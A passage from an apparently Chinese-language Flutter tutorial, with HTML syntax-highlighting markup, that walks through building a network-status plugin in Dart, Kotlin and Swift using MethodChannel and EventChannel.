                size: Size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>),
              ),
            ],
          );
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (snapshot.hasError) {
          <span class="hljs-keyword">return</span> Text(<span class="hljs-string">'error: <span class="hljs-subst">${snapshot.error}</span>'</span>);
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">return</span> CircularProgressIndicator();
        }
      },
    );
  }
}
</code></pre>
<p><strong>EventChannel实际应用场景如下：</strong></p>
<ul>
<li>加速度计、陀螺仪等</li>
<li>GPS位置实时变化</li>
<li>网络连接状态变化</li>
<li>蓝牙设备发现和数据接收</li>
<li>下载进度实时更新</li>
</ul>
<h3 data-id="heading-25">五、自定义插件</h3>
<h4 data-id="heading-26">5.1 插件项目结构</h4>
<p>一个标准的Flutter插件目录结构如下：</p>
<pre><code class="hljs language-bash" lang="bash">flutter_custom_plugin/
├── android/                     <span class="hljs-comment"># Android平台代码</span>
│   ├── build.gradle             <span class="hljs-comment"># Android构建配置</span>
│   ├── src/main/
│   │   ├── kotlin/
│   │   │   └── com/xxxx/flutter_custom_plugin/
│   │   │       └── FlutterCustomPlugin.kt
│   │   └── AndroidManifest.xml
├── ios/                       <span class="hljs-comment"># iOS平台代码</span>
│   ├── Classes/
│   │   └── FlutterCustomPlugin.swift
│   └── flutter_custom_plugin.podspec
├── lib/                       <span class="hljs-comment"># Dart库代码</span>
│   ├── flutter_custom_plugin.dart
│   └── src/
│       └── implementation.dart
├── xxxx/                   <span class="hljs-comment"># 案例应用</span>
│   ├── android/
│   ├── ios/
│   └── lib/main.dart
├── pubspec.yaml              <span class="hljs-comment"># 插件配置</span>
└── README.md                 <span class="hljs-comment"># 文档</span>
</code></pre>
<h4 data-id="heading-27">5.2 以网络状态监听插件为例</h4>
<h5 data-id="heading-28">第一步：创建插件项目</h5>
<pre><code class="hljs language-bash" lang="bash">flutter create --template=plugin --org=com.xxxx--platforms=android,ios flutter_network_plugin
<span class="hljs-built_in">cd</span> flutter_network_plugin
</code></pre>
<h5 data-id="heading-29">第二步：编写Dart API</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/flutter_network_plugin.dart</span>
<span class="hljs-keyword">library</span> flutter_network_plugin;

<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:async'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-comment">/// <span class="markdown">网络类型枚举</span></span>
<span class="hljs-keyword">enum</span> NetworkType {
  wifi,
  mobile,
  ethernet,
  bluetooth,
  vpn,
  none,
  unknown,
}

<span class="hljs-comment">/// <span class="markdown">网络状态类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkStatus</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> isConnected;
  <span class="hljs-keyword">final</span> NetworkType type;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> subtype;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> isRoaming;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> extraInfo;
  
  NetworkStatus({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.isConnected,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.type,
    <span class="hljs-keyword">this</span>.subtype,
    <span class="hljs-keyword">this</span>.isRoaming = <span class="hljs-keyword">false</span>,
    <span class="hljs-keyword">this</span>.extraInfo,
  });
  
  <span class="hljs-comment">/// <span class="markdown">从Map转换</span></span>
  <span class="hljs-keyword">factory</span> NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; map) {
    <span class="hljs-keyword">return</span> NetworkStatus(
      isConnected: map[<span class="hljs-string">'isConnected'</span>] ?? <span class="hljs-keyword">false</span>,
      type: _parseNetworkType(map[<span class="hljs-string">'type'</span>]),
      subtype: map[<span class="hljs-string">'subtype'</span>],
      isRoaming: map[<span class="hljs-string">'isRoaming'</span>] ?? <span class="hljs-keyword">false</span>,
      extraInfo: map[<span class="hljs-string">'extraInfo'</span>],
    );
  }
  
  <span class="hljs-comment">/// <span class="markdown">转换为Map</span></span>
  <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; toMap() {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-string">'isConnected'</span>: isConnected,
      <span class="hljs-string">'type'</span>: type.toString().split(<span class="hljs-string">'.'</span>).last,
      <span class="hljs-string">'subtype'</span>: subtype,
      <span class="hljs-string">'isRoaming'</span>: isRoaming,
      <span class="hljs-string">'extraInfo'</span>: extraInfo,
    };
  }
  
  <span class="hljs-comment">/// <span class="markdown">解析网络类型</span></span>
  <span class="hljs-keyword">static</span> NetworkType _parseNetworkType(<span class="hljs-built_in">String?</span> type) {
    <span class="hljs-keyword">switch</span> (type?.toLowerCase()) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'wifi'</span>:
        <span class="hljs-keyword">return</span> NetworkType.wifi;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'mobile'</span>:
        <span class="hljs-keyword">return</span> NetworkType.mobile;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'ethernet'</span>:
        <span class="hljs-keyword">return</span> NetworkType.ethernet;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'bluetooth'</span>:
        <span class="hljs-keyword">return</span> NetworkType.bluetooth;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'vpn'</span>:
        <span class="hljs-keyword">return</span> NetworkType.vpn;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'none'</span>:
        <span class="hljs-keyword">return</span> NetworkType.none;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> NetworkType.unknown;
    }
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">String</span> toString() {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'NetworkStatus{isConnected: <span class="hljs-subst">$isConnected</span>, type: <span class="hljs-subst">$type</span>, subtype: <span class="hljs-subst">$subtype</span>}'</span>;
  }
}

<span class="hljs-comment">/// <span class="markdown">网络状态插件</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterNetworkPlugin</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _methodChannel =
      MethodChannel(<span class="hljs-string">'flutter_network_plugin/method'</span>);
  
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> EventChannel _eventChannel =
      EventChannel(<span class="hljs-string">'flutter_network_plugin/event'</span>);
  
  <span class="hljs-comment">/// <span class="markdown">单例</span></span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> FlutterNetworkPlugin _instance = FlutterNetworkPlugin._internal();
  <span class="hljs-keyword">factory</span> FlutterNetworkPlugin() =&gt; _instance;
  FlutterNetworkPlugin._internal();
  
  <span class="hljs-comment">/// <span class="markdown">获取当前网络状态</span></span>
  <span class="hljs-keyword">static</span> Future&lt;NetworkStatus&gt; <span class="hljs-keyword">get</span> currentStatus <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; status =
          <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'getCurrentStatus'</span>);
      <span class="hljs-keyword">return</span> NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(status));
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取网络状态失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> NetworkStatus(
        isConnected: <span class="hljs-keyword">false</span>,
        type: NetworkType.unknown,
      );
    }
  }
  
  <span class="hljs-comment">/// <span class="markdown">检查是否有网络连接</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">bool</span>&gt; <span class="hljs-keyword">get</span> isConnected <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> currentStatus;
    <span class="hljs-keyword">return</span> status.isConnected;
  }
  
  <span class="hljs-comment">/// <span class="markdown">网络状态变化流</span></span>
  <span class="hljs-keyword">static</span> Stream&lt;NetworkStatus&gt; <span class="hljs-keyword">get</span> onStatusChanged {
    <span class="hljs-keyword">return</span> _eventChannel
        .receiveBroadcastStream()
        .map((data) =&gt; NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(data)))
        .handleError((error) {
          <span class="hljs-built_in">print</span>(<span class="hljs-string">'网络状态监听错误: <span class="hljs-subst">$error</span>'</span>);
        });
  }
  
  <span class="hljs-comment">/// <span class="markdown">初始化插件</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; initialize() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'initialize'</span>);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'初始化插件失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">/// <span class="markdown">释放资源</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; dispose() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'dispose'</span>);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'释放插件资源失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
}
</code></pre>
<h5 data-id="heading-30">第三步：实现Android端代码</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// android/src/main/kotlin/com/xxxx/flutter_network_plugin/FlutterNetworkPlugin.kt</span>
<span class="hljs-keyword">package</span> com.example.flutter_network_plugin

<span class="hljs-keyword">import</span> android.content.Context
<span class="hljs-keyword">import</span> android.net.ConnectivityManager
<span class="hljs-keyword">import</span> android.net.Network
<span class="hljs-keyword">import</span> android.net.NetworkCapabilities
<span class="hljs-keyword">import</span> android.net.NetworkRequest
<span class="hljs-keyword">import</span> android.os.Build
<span class="hljs-keyword">import</span> androidx.<span class="hljs-keyword">annotation</span>.RequiresApi
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.plugins.FlutterPlugin
<span class="hljs-keyword">import</span> io.flutter.plugin.common.EventChannel
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodCall
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel.MethodCallHandler
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel.Result

<span class="hljs-comment">/** FlutterNetworkPlugin */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FlutterNetworkPlugin</span> : <span class="hljs-type">FlutterPlugin</span>, <span class="hljs-type">MethodCallHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> context: Context
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> methodChannel: MethodChannel
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> eventChannel: EventChannel
    
    <span class="hljs-comment">// 事件发送器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: EventChannel.EventSink? = <span class="hljs-literal">null</span>
    
    <span class="hljs-comment">// 网络相关</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> connectivityManager: ConnectivityManager? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> networkCallback: ConnectivityManager.NetworkCallback? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAttachedToEngine</span><span class="hljs-params">(flutterPluginBinding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
        context = flutterPluginBinding.applicationContext
        methodChannel = MethodChannel(
            flutterPluginBinding.binaryMessenger,
            <span class="hljs-string">"flutter_network_plugin/method"</span>
        )
        methodChannel.setMethodCallHandler(<span class="hljs-keyword">this</span>)
        
        eventChannel = EventChannel(
            flutterPluginBinding.binaryMessenger,
            <span class="hljs-string">"flutter_network_plugin/event"</span>
        )
        eventChannel.setStreamHandler(<span class="hljs-keyword">object</span> : EventChannel.StreamHandler {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onListen</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?, events: <span class="hljs-type">EventChannel</span>.<span class="hljs-type">EventSink</span>?)</span></span> {
                eventSink = events
                <span class="hljs-comment">// 立即发送当前状态</span>
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCancel</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?)</span></span> {
                eventSink = <span class="hljs-literal">null</span>
            }
        })
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDetachedFromEngine</span><span class="hljs-params">(binding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
        methodChannel.setMethodCallHandler(<span class="hljs-literal">null</span>)
        unregisterNetworkCallback()
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodCall</span><span class="hljs-params">(call: <span class="hljs-type">MethodCall</span>, result: <span class="hljs-type">Result</span>)</span></span> {
        <span class="hljs-keyword">when</span> (call.method) {
            <span class="hljs-string">"getCurrentStatus"</span> -&gt; {
                result.success(getCurrentNetworkStatus())
            }
            <span class="hljs-string">"initialize"</span> -&gt; {
                initializeNetworkMonitoring()
                result.success(<span class="hljs-literal">null</span>)
            }
            <span class="hljs-string">"dispose"</span> -&gt; {
                unregisterNetworkCallback()
                result.success(<span class="hljs-literal">null</span>)
            }
            <span class="hljs-keyword">else</span> -&gt; result.notImplemented()
        }
    }
    
    <span class="hljs-comment">/**
     * 获取当前网络状态
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCurrentNetworkStatus</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) {
            getNetworkStatusModern()
        } <span class="hljs-keyword">else</span> {
            getNetworkStatusLegacy()
        }
    }
    
    <span class="hljs-meta">@RequiresApi(Build.VERSION_CODES.M)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNetworkStatusModern</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> activeNetwork = connectivityManager?.activeNetwork
        <span class="hljs-keyword">val</span> networkCapabilities = connectivityManager?.getNetworkCapabilities(activeNetwork)
        
        <span class="hljs-keyword">val</span> isConnected = networkCapabilities != <span class="hljs-literal">null</span> &amp;&amp;
                (networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
        
        <span class="hljs-keyword">val</span> type = <span class="hljs-keyword">when</span> {
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"wifi"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"mobile"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"ethernet"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"bluetooth"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"vpn"</span>
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"none"</span>
        }
        
        <span class="hljs-keyword">return</span> mapOf(
            <span class="hljs-string">"isConnected"</span> to isConnected,
            <span class="hljs-string">"type"</span> to type,
            <span class="hljs-string">"isRoaming"</span> to <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span> to <span class="hljs-literal">null</span>
        )
    }
    
    <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNetworkStatusLegacy</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        <span class="hljs-keyword">val</span> cm = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> activeNetworkInfo = cm.activeNetworkInfo
        <span class="hljs-keyword">val</span> isConnected = activeNetworkInfo?.isConnected == <span class="hljs-literal">true</span>
        <span class="hljs-keyword">val</span> type = <span class="hljs-keyword">when</span> (activeNetworkInfo?.type) {
            ConnectivityManager.TYPE_WIFI -&gt; <span class="hljs-string">"wifi"</span>
            ConnectivityManager.TYPE_MOBILE -&gt; <span class="hljs-string">"mobile"</span>
            ConnectivityManager.TYPE_ETHERNET -&gt; <span class="hljs-string">"ethernet"</span>
            ConnectivityManager.TYPE_BLUETOOTH -&gt; <span class="hljs-string">"bluetooth"</span>
            ConnectivityManager.TYPE_VPN -&gt; <span class="hljs-string">"vpn"</span>
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"none"</span>
        }
        
        <span class="hljs-keyword">return</span> mapOf(
            <span class="hljs-string">"isConnected"</span> to isConnected,
            <span class="hljs-string">"type"</span> to type,
            <span class="hljs-string">"isRoaming"</span> to activeNetworkInfo?.isRoaming ?: <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span> to activeNetworkInfo?.extraInfo
        )
    }
    
    <span class="hljs-comment">/**
     * 初始化网络监控
     */</span>
    <span class="hljs-meta">@RequiresApi(Build.VERSION_CODES.LOLLIPOP)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initializeNetworkMonitoring</span><span class="hljs-params">()</span></span> {
        connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> networkRequest = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .addTransportType(NetworkCapabilities.TRANSPORT_ETHERNET)
            .addTransportType(NetworkCapabilities.TRANSPORT_BLUETOOTH)
            .addTransportType(NetworkCapabilities.TRANSPORT_VPN)
            .build()
        
        networkCallback = <span class="hljs-keyword">object</span> : ConnectivityManager.NetworkCallback() {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAvailable</span><span class="hljs-params">(network: <span class="hljs-type">Network</span>)</span></span> {
                <span class="hljs-keyword">super</span>.onAvailable(network)
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onLost</span><span class="hljs-params">(network: <span class="hljs-type">Network</span>)</span></span> {
                <span class="hljs-keyword">super</span>.onLost(network)
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCapabilitiesChanged</span><span class="hljs-params">(
                network: <span class="hljs-type">Network</span>,
                networkCapabilities: <span class="hljs-type">NetworkCapabilities</span>
            )</span></span> {
                <span class="hljs-keyword">super</span>.onCapabilitiesChanged(network, networkCapabilities)
                sendCurrentStatus()
            }
        }
        
        connectivityManager?.registerNetworkCallback(networkRequest, networkCallback!!)
    }
    
    <span class="hljs-comment">/**
     * 取消网络监控
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unregisterNetworkCallback</span><span class="hljs-params">()</span></span> {
        networkCallback?.let {
            connectivityManager?.unregisterNetworkCallback(it)
            networkCallback = <span class="hljs-literal">null</span>
        }
    }
    
    <span class="hljs-comment">/**
     * 发送当前状态到Dart
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendCurrentStatus</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> status = getCurrentNetworkStatus()
        eventSink?.success(status)
    }
}
</code></pre>
<h5 data-id="heading-31">第四步：实现iOS端代码</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ios/Classes/FlutterNetworkPlugin.swift</span>
<span class="hljs-keyword">import</span> Flutter
<span class="hljs-keyword">import</span> Foundation
<span class="hljs-keyword">import</span> SystemConfiguration
<span class="hljs-keyword">import</span> Network

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlutterNetworkPlugin</span>: <span class="hljs-title class_">NSObject</span>, <span class="hljs-title class_">FlutterPlugin</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: <span class="hljs-type">FlutterEventSink</span>?
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> monitor: <span class="hljs-type">NWPathMonitor</span>?
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"NetworkMonitor"</span>)
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">with</span> <span class="hljs-params">registrar</span>: <span class="hljs-type">FlutterPluginRegistrar</span>) {
        <span class="hljs-keyword">let</span> instance <span class="hljs-operator">=</span> <span class="hljs-type">FlutterNetworkPlugin</span>()
        
        <span class="hljs-comment">// 方法通道</span>
        <span class="hljs-keyword">let</span> methodChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterMethodChannel</span>(
            name: <span class="hljs-string">"flutter_network_plugin/method"</span>,
            binaryMessenger: registrar.messenger()
        )
        registrar.addMethodCallDelegate(instance, channel: methodChannel)
        
        <span class="hljs-comment">// 事件通道</span>
        <span class="hljs-keyword">let</span> eventChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterEventChannel</span>(
            name: <span class="hljs-string">"flutter_network_plugin/event"</span>,
            binaryMessenger: registrar.messenger()
        )
        eventChannel.setStreamHandler(instance)
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">handle</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">call</span>: <span class="hljs-type">FlutterMethodCall</span>, <span class="hljs-params">result</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">switch</span> call.method {
        <span class="hljs-keyword">case</span> <span class="hljs-string">"getCurrentStatus"</span>:
            result(getCurrentNetworkStatus())
        <span class="hljs-keyword">case</span> <span class="hljs-string">"initialize"</span>:
            initializeNetworkMonitoring()
            result(<span class="hljs-literal">nil</span>)
        <span class="hljs-keyword">case</span> <span class="hljs-string">"dispose"</span>:
            disposeNetworkMonitoring()
            result(<span class="hljs-literal">nil</span>)
        <span class="hljs-keyword">default</span>:
            result(<span class="hljs-type">FlutterMethodNotImplemented</span>)
        }
    }
    
    <span class="hljs-comment">// 获取当前网络状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getCurrentNetworkStatus</span>() -&gt; [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] {
        <span class="hljs-keyword">var</span> zeroAddress <span class="hljs-operator">=</span> sockaddr_in()
        zeroAddress.sin_len <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(<span class="hljs-type">MemoryLayout</span>&lt;sockaddr_in&gt;.size)
        zeroAddress.sin_family <span class="hljs-operator">=</span> sa_family_t(<span class="hljs-type">AF_INET</span>)
        
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> defaultRouteReachability <span class="hljs-operator">=</span> <span class="hljs-built_in">withUnsafePointer</span>(to: <span class="hljs-operator">&amp;</span>zeroAddress, {
            <span class="hljs-variable">$0</span>.withMemoryRebound(to: sockaddr.<span class="hljs-keyword">self</span>, capacity: <span class="hljs-number">1</span>) {
                <span class="hljs-type">SCNetworkReachabilityCreateWithAddress</span>(<span class="hljs-literal">nil</span>, <span class="hljs-variable">$0</span>)
            }
        }) <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> [
                <span class="hljs-string">"isConnected"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"none"</span>,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
        }
        
        <span class="hljs-keyword">var</span> flags: <span class="hljs-type">SCNetworkReachabilityFlags</span> <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span><span class="hljs-type">SCNetworkReachabilityGetFlags</span>(defaultRouteReachability, <span class="hljs-operator">&amp;</span>flags) {
            <span class="hljs-keyword">return</span> [
                <span class="hljs-string">"isConnected"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"none"</span>,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
        }
        
        <span class="hljs-keyword">let</span> isReachable <span class="hljs-operator">=</span> flags.contains(.reachable)
        <span class="hljs-keyword">let</span> needsConnection <span class="hljs-operator">=</span> flags.contains(.connectionRequired)
        <span class="hljs-keyword">let</span> isConnected <span class="hljs-operator">=</span> isReachable <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">!</span>needsConnection
        
        <span class="hljs-keyword">var</span> type <span class="hljs-operator">=</span> <span class="hljs-string">"none"</span>
        <span class="hljs-keyword">if</span> flags.contains(.isWWAN) {
            type <span class="hljs-operator">=</span> <span class="hljs-string">"mobile"</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> flags.contains(.connectionRequired) {
            <span class="hljs-comment">// 需要连接但不可达</span>
        } <span class="hljs-keyword">else</span> {
            type <span class="hljs-operator">=</span> <span class="hljs-string">"wifi"</span>
        }
        
        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">"isConnected"</span>: isConnected,
            <span class="hljs-string">"type"</span>: type,
            <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
        ]
    }
    
    <span class="hljs-comment">// 初始化网络监控</span>
    <span class="hljs-keyword">@available</span>(<span class="hljs-keyword">iOS</span> <span class="hljs-number">12.0</span>, <span class="hljs-operator">*</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initializeNetworkMonitoring</span>() {
        monitor <span class="hljs-operator">=</span> <span class="hljs-type">NWPathMonitor</span>()
        
        monitor<span class="hljs-operator">?</span>.pathUpdateHandler <span class="hljs-operator">=</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] path <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword">self</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> }
            
            <span class="hljs-keyword">let</span> isConnected <span class="hljs-operator">=</span> path.status <span class="hljs-operator">==</span> .satisfied
            <span class="hljs-keyword">var</span> type <span class="hljs-operator">=</span> <span class="hljs-string">"none"</span>
            
            <span class="hljs-keyword">if</span> path.usesInterfaceType(.wifi) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"wifi"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.cellular) {
